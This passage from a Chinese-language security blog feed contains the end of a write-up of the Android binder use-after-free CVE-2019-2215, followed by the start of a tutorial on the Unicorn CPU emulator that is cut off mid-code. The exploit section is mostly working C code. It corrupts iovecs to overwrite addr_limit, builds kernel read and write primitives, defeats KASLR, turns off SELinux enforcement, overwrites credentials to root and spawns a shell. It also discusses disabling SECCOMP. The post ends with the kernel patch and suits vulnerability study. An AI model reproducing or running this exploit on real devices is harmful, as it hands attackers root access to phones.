</span><span style="color:#75715e"></span>        <span style="color:#75715e">// blocking in writev before the unlink happens
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        sleep(<span style="color:#ae81ff">2</span>);
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Trigger the unlink operation on the reallocated chunk
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        unlinkEventPollWaitQueueFromBinderThreadWaitQueue();
        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered
</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Write rest of the data to the socket so that recvmsg starts
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// processing the corrupted iovecs and we get scoped write and
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// finally arbitrary write
</span><span style="color:#75715e"></span>        nBytesWritten <span style="color:#f92672">=</span> write(sock_fd[<span style="color:#ae81ff">1</span>], finalSocketData, <span style="color:#66d9ef">sizeof</span>(finalSocketData));
        <span style="color:#66d9ef">if</span> (nBytesWritten <span style="color:#f92672">!=</span> <span style="color:#66d9ef">sizeof</span>(finalSocketData)) {
            ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&#34;</span>, nBytesWritten, <span style="color:#66d9ef">sizeof</span>(finalSocketData));
            exit(EXIT_FAILURE);
        }
        exit(EXIT_SUCCESS);
    }
    <span style="color:#75715e">// parent process
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I have seen some races which hinders the reallocation.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// So, now freeing the binder_thread after fork.
</span><span style="color:#75715e"></span>    freeBinderThread();
    <span style="color:#75715e">// Reallocate binder_thread as iovec array and
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// we need to make sure this recvmsg call blocks.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// recvmsg will block after processing a valid iovec at
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX]
</span><span style="color:#75715e"></span>    ssize_t nBytesReceived <span style="color:#f92672">=</span> recvmsg(sock_fd[<span style="color:#ae81ff">0</span>], <span style="color:#f92672">&amp;</span>message, MSG_WAITALL);
    <span style="color:#75715e">// If the corruption was successful, the total bytes received
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// should be equal to length of all iovec. This is because there
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// are three valid iovec
</span><span style="color:#75715e"></span>    ssize_t expectedBytesReceived <span style="color:#f92672">=</span> iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">+</span>
                                    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">+</span>
                                    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len;
    <span style="color:#66d9ef">if</span> (nBytesReceived <span style="color:#f92672">!=</span> expectedBytesReceived) {
        ERR(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nBytesReceived, expectedBytesReceived);
        exit(EXIT_FAILURE);
    }
    <span style="color:#75715e">// Wait for the child process to exit
</span><span style="color:#75715e"></span>    wait(nullptr);
}
</code></pre></div><p>这里就要将addr_limit的值改为<code>0xFFFFFFFFFFFFFFFE</code>在arm64里有个检查函数<code>do_page_fault</code>会检测该值是否为<code>0xFFFFFFFFFFFFFFFF</code>，如果是就触发奔溃，所以一般都设为<code>0xFFFFFFFFFFFFFFFE</code>。</p>
<p>前面是从内核读出数据，这里要实现的是向内核写入数据。</p>
<p>看看这里的iovecStack结构：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    iovecStack[IOVEC_WQ_INDEX].iov_base <span style="color:#f92672">=</span> m_4gb_aligned_page;
    iovecStack[IOVEC_WQ_INDEX].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x41414141</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_base <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) <span style="color:#ae81ff">0x42424242</span>;
    iovecStack[IOVEC_WQ_INDEX <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>].iov_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>;
</code></pre></div><p>和前面泄露信息的布局是差不多。</p>
<p>首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用<code>recvmsg</code>系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。</p>
<p>子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> uint64_t finalSocketData[] <span style="color:#f92672">=</span> {
            <span style="color:#ae81ff">0x1</span>,                    <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX].iov_len
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x41414141</span>,             <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>,  <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span><span style="color:#75715e"></span>            (uint64_t) ((uint8_t <span style="color:#f92672">*</span>) m_task_struct <span style="color:#f92672">+</span>
                        OFFSET_TASK_STRUCT_ADDR_LIMIT), <span style="color:#75715e">// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span><span style="color:#75715e"></span>            <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFE</span>      <span style="color:#75715e">// addr_limit value
</span><span style="color:#75715e"></span>    };
</code></pre></div><p>对应上面的值。</p>
<p>到这里我们就有了完整的内核读写权限，接下绕过kaslr、禁用SElinux、patchCred就可以获得root权限。</p>
<h4 id="bypass-kaslr-and-disabling-selinux">bypass kaslr and Disabling SELinux</h4>
<p>前面已经了有了完整的读写权限，那这就很简单了。</p>
<p>任意读写的实现：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>kRead(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>Address, size_t Length, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>uBuffer) {
    ssize_t nBytesWritten <span style="color:#f92672">=</span> write(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">1</span>], Address, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesWritten <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to write data from kernel: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
    ssize_t nBytesRead <span style="color:#f92672">=</span> read(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">0</span>], uBuffer, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesRead <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to read data from kernel: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
}

<span style="color:#66d9ef">void</span> BinderUaF<span style="color:#f92672">::</span>kWrite(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>Address, size_t Length, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>uBuffer) {
    ssize_t nBytesWritten <span style="color:#f92672">=</span> write(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">1</span>], uBuffer, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesWritten <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to write data from user: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
    ssize_t nBytesRead <span style="color:#f92672">=</span> read(m_kernel_rw_pipe_fd[<span style="color:#ae81ff">0</span>], Address, Length);
    <span style="color:#66d9ef">if</span> ((size_t) nBytesRead <span style="color:#f92672">!=</span> Length) {
        ERR(<span style="color:#e6db74">&#34;[-] Failed to write data to kernel: %p&#34;</span>, Address);
        exit(EXIT_FAILURE);
    }
}
</code></pre></div><p>任意读的话，利用write和read两个系统调用，使用write将数据写到pipe，并在管道的另一端read一个内核地址，就可以将数据写入该内核地址。任意写的话，与之相反。这样就实现了任意读写。</p>
<p>task_struct 有一个全局指针nsproxy ，前面已经泄露出来了，就可以更具偏移直接算出Kernel_base_addr。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    ptrdiff_t kernelBase <span style="color:#f92672">=</span> nsProxy <span style="color:#f92672">-</span> SYMBOL_OFFSET_init_nsproxy;
    <span style="color:#66d9ef">auto</span> selinuxEnforcing <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) (kernelBase <span style="color:#f92672">+</span> SYMBOL_OFFSET_selinux_enforcing);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] nsproxy: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nsProxy);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Kernel base: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernelBase);
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] selinux_enforcing: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, selinuxEnforcing);
    <span style="color:#66d9ef">int</span> selinuxEnabled <span style="color:#f92672">=</span> kReadDword(selinuxEnforcing);
    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>selinuxEnabled) {
        INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] selinux enforcing is disabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
        <span style="color:#66d9ef">return</span>;
    }
    INFO(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] selinux enforcing is enabled</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

    kWriteDword(selinuxEnforcing, <span style="color:#ae81ff">0x0</span>);
</code></pre></div><p>这里只需要对于SELinux只需根据kernelBase 计算出具体的地址，再直接进行写入0x0即可禁用掉。</p>
<p>现在的版本越来越多保护和检查机制，实际上直接这样不一定是不可行，有时得恢复kallsyms表才行</p>
<h4 id="root">Root</h4>
<p>提权的常用语句<code>commit_creds(prepare_kernel_cred(NULL));</code>，这就是常规的套路了。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, uid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, gid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, suid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, sgid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, euid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, egid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, fsuid)), GLOBAL_ROOT_UID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, fsgid)), GLOBAL_ROOT_GID);
    kWriteDword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, securebits)), SECUREBITS_DEFAULT);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_inheritable)), CAP_EMPTY_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_permitted)), CAP_FULL_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_effective)), CAP_FULL_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_bset)), CAP_FULL_SET);
    kWriteQword((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>) ((uint8_t <span style="color:#f92672">*</span>) m_cred <span style="color:#f92672">+</span> offsetof(<span style="color:#66d9ef">struct</span> cred, cap_ambient)), CAP_EMPTY_SET);
</code></pre></div><p>前面已经泄露出了task_struct-&gt;cred的地址，这里就只用将事先准备好的cred结构体写入即可</p>
<p>最后执行<code>system(&quot;/bin/sh&quot;);</code>、<code>execve(&quot;/system/bin/sh&quot;);</code>即可获得root权限。</p>
<p><img src="img/image-20200629174038205.png" alt="image-20200629174038205"></p>
<h4 id="disabling-seccomp">Disabling SECCOMP</h4>
<p>额外的如果想要将提权程序捆绑到app上的还需要这一步，Android8开始，所有 Android 软件都使用系统调用与 Linux 内核进行通信，SECCOMP过滤器会检测所有的非法调用。SECCOMP过滤器是放在zygote 进程中，而所有的Android应用程序都是该进程fork出来的，按理所以会影响到所有的应用，但是Android安全团队进行了部分筛选，只会阻止某些系统调用。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> seccomp {
	<span style="color:#66d9ef">int</span> mode;
	<span style="color:#66d9ef">struct</span> seccomp_filter <span style="color:#f92672">*</span>filter;
};
</code></pre></div><p>想要禁用SECCOMP，直接将mode改为0是导致内核崩溃，需要清除TIF_SECCOMP 标志。<a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/">这篇文章</a>实现了绕过，感兴趣可以看一看。</p>
<p>对于三星的设备，还需要绕过Knox/RKP才行。对于如何绕过，最近有人公开了s8相关的<a href="https://github.com/chompie1337/s8_2019_2215_poc">利用代码</a>，感兴趣可以看看。</p>
<h4 id="patch">patch</h4>
<p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&amp;id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b">patch</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">diff <span style="color:#f92672">--</span>git a<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c b<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c
index a340766b51fe.<span style="color:#ae81ff">.2</span>ef8bd29e188 <span style="color:#ae81ff">100644</span>
<span style="color:#f92672">---</span> a<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c
<span style="color:#f92672">+++</span> b<span style="color:#f92672">/</span>drivers<span style="color:#f92672">/</span>android<span style="color:#f92672">/</span>binder.c
<span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4302</span>,<span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">4302</span>,<span style="color:#ae81ff">18</span> <span style="color:#960050;background-color:#1e0010">@@</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> binder_thread_release(<span style="color:#66d9ef">struct</span> binder_proc <span style="color:#f92672">*</span>proc,
 		<span style="color:#66d9ef">if</span> (t)
 			spin_lock(<span style="color:#f92672">&amp;</span>t<span style="color:#f92672">-&gt;</span>lock);
 	}
<span style="color:#f92672">+</span>
<span style="color:#f92672">+</span>	<span style="color:#75715e">/*
</span><span style="color:#75715e">+	 * If this thread used poll, make sure we remove the waitqueue
</span><span style="color:#75715e">+	 * from any epoll data structures holding it with POLLFREE.
</span><span style="color:#75715e">+	 * waitqueue_active() is safe to use here because we&#39;re holding
</span><span style="color:#75715e">+	 * the inner lock.
</span><span style="color:#75715e">+	 */</span>
<span style="color:#f92672">+</span>	<span style="color:#66d9ef">if</span> ((<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>looper <span style="color:#f92672">&amp;</span> BINDER_LOOPER_STATE_POLL) <span style="color:#f92672">&amp;&amp;</span>
<span style="color:#f92672">+</span>	    waitqueue_active(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>wait)) {
<span style="color:#f92672">+</span>		wake_up_poll(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>wait, POLLHUP <span style="color:#f92672">|</span> POLLFREE);
<span style="color:#f92672">+</span>	}
<span style="color:#f92672">+</span>
 	binder_inner_proc_unlock(<span style="color:#66d9ef">thread</span><span style="color:#f92672">-&gt;</span>proc);
 
 	<span style="color:#66d9ef">if</span> (send_reply)
</code></pre></div><p>在binder_thread free之前清理掉thread-&gt;wait即可。</p>
<h3 id="总结">总结</h3>
<p>去年出的经典的提权漏洞，这个漏洞当做提权入门也还不错，可以学习到一个完整的提权流程和几个常见方法。</p>
<p>后续真机测试过程中手上没pixel2 只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。</p>
<p>提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。</p>
<p>关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。</p>
<h4 id="参考">参考</h4>
<ul>
<li><a href="https://www.52pojie.cn/thread-1083552-1-1.html">https://www.52pojie.cn/thread-1083552-1-1.html</a></li>
<li><a href="https://blog.csdn.net/weixin_43901866/article/details/102458212">https://blog.csdn.net/weixin_43901866/article/details/102458212</a></li>
<li><a href="https://cloudfuzz.github.io/android-kernel-exploitation/">https://cloudfuzz.github.io/android-kernel-exploitation/</a></li>
<li><a href="https://github.com/sharif-dev/AndroidKernelVulnerability">https://github.com/sharif-dev/AndroidKernelVulnerability</a></li>
<li><a href="https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/">https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/</a></li>
<li><a href="https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/">https://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Unicorn简单学习使用记录</title>
            <link>https://kuekiko.top/posts/2020/04/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</link>
            <pubDate>Fri, 17 Apr 2020 19:01:19 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2020/04/unicorn%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</guid>
            <description>0x00 介绍 Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等。
0x01 安装   官网有编译好不同平台的二进制包，直接安装就行。但是看了一下时间2017年的，qemu已经升级好几个版本了。api也比较老旧。
  去github看了一下是否有在更新，发现一直有在更新，不过好像也没更新啥，只是修复一些bug，下载git源码，自己编译。目前最新1.0.2rc
git clone https://github.com/unicorn-engine/unicorn.gitcd unicorn# UNICORN_ARCHS=&amp;#34;arm aarch64 x86&amp;#34; ./make.sh # 设置要编译的架构 可选 默认6种全编译 (Arm, Arm64, M68K, Mips, Sparc, &amp;amp; X86)./make.shsudo ./make.sh install# python 绑定cd bindings/pythonsudo python3 setup.py install还有更多交叉编译选项参考 文档
  0x02 简单使用 C :
#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;unicorn/unicorn.h&amp;gt;// 要模拟的指令#define X86_CODE32 &amp;#34;\x41\x4a&amp;#34; // INC ecx; DEC edx// 起始地址#define ADDRESS 0x1000000int main(int argc, char const *argv[]){// 设置engine uc_engine *uc;uc_err err;//设置寄存器 int r_ecx = 0x1234;int r_edx = 0x5678;printf(&amp;#34;Emulate i386 code\n&amp;#34;);// x86 32bit 初始化 err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;amp;uc);if (err !</description>
            <content type="html"><![CDATA[<h3 id="0x00-介绍">0x00 介绍</h3>
<p>Unicorn是一个轻量级, 多平台, 多架构的CPU模拟器框架，基于qemu开发，它可以代替CPU模拟代码的执行，常用于恶意代码分析，Fuzz等。</p>
<h3 id="0x01-安装">0x01 安装</h3>
<ol>
<li>
<p>官网有编译好不同平台的<a href="http://www.unicorn-engine.org/download/">二进制包</a>，直接安装就行。但是看了一下时间2017年的，qemu已经升级好几个版本了。api也比较老旧。</p>
</li>
<li>
<p>去github看了一下是否有在更新，发现一直有在更新，不过好像也没更新啥，只是修复一些bug，下载git源码，自己编译。目前最新1.0.2rc</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/unicorn-engine/unicorn.git
cd unicorn
<span style="color:#75715e"># UNICORN_ARCHS=&#34;arm aarch64 x86&#34; ./make.sh # 设置要编译的架构 可选 默认6种全编译 (Arm, Arm64, M68K, Mips, Sparc, &amp; X86)</span>
./make.sh
sudo ./make.sh install
   
<span style="color:#75715e"># python 绑定</span>
cd bindings/python
sudo python3 setup.py install
</code></pre></div><p>还有更多交叉编译选项参考 <a href="https://github.com/unicorn-engine/unicorn/blob/master/docs/COMPILE-NIX.md">文档</a></p>
</li>
</ol>
<h3 id="0x02-简单使用">0x02 简单使用</h3>
<p>C :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unicorn/unicorn.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// 要模拟的指令
</span><span style="color:#75715e"></span><span style="color:#75715e">#define X86_CODE32 &#34;\x41\x4a&#34; </span><span style="color:#75715e">// INC ecx; DEC edx
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// 起始地址
</span><span style="color:#75715e"></span><span style="color:#75715e">#define ADDRESS 0x1000000
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#66d9ef">const</span> <span style="color:#f92672">*</span>argv[]){
  <span style="color:#75715e">// 设置engine
</span><span style="color:#75715e"></span>  uc_engine <span style="color:#f92672">*</span>uc;
  uc_err err;

  <span style="color:#75715e">//设置寄存器
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> r_ecx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1234</span>;
  <span style="color:#66d9ef">int</span> r_edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x5678</span>;
  printf(<span style="color:#e6db74">&#34;Emulate i386 code</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

  <span style="color:#75715e">// x86 32bit 初始化
</span><span style="color:#75715e"></span>  err <span style="color:#f92672">=</span> uc_open(UC_ARCH_X86, UC_MODE_32, <span style="color:#f92672">&amp;</span>uc);
  <span style="color:#66d9ef">if</span> (err <span style="color:#f92672">!=</span> UC_ERR_OK){
    printf(<span style="color:#e6db74">&#34;Failed on uc_open() with error returned: %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, err);
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }
  <span style="color:#75715e">// 给模拟器申请 2MB 内存
</span><span style="color:#75715e"></span>  uc_mem_map(uc, ADDRESS, <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>, UC_PROT_ALL);

  <span style="color:#75715e">// 将要模拟的指令写入内存
</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span style="color:#66d9ef">sizeof</span>(X86_CODE32) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)){
    printf(<span style="color:#e6db74">&#34;Failed to write emulation code to memory, quit!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
  }
  <span style="color:#75715e">// 初始化寄存器
</span><span style="color:#75715e"></span>  uc_reg_write(uc, UC_X86_REG_ECX, <span style="color:#f92672">&amp;</span>r_ecx);
  uc_reg_write(uc, UC_X86_REG_EDX, <span style="color:#f92672">&amp;</span>r_edx);
  printf(<span style="color:#e6db74">&#34;&gt;&gt;&gt; ECX = 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, r_ecx);
  printf(<span style="color:#e6db74">&#34;&gt;&gt;&gt; EDX = 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, r_edx);

  <span style="color:#75715e">// 模拟代码
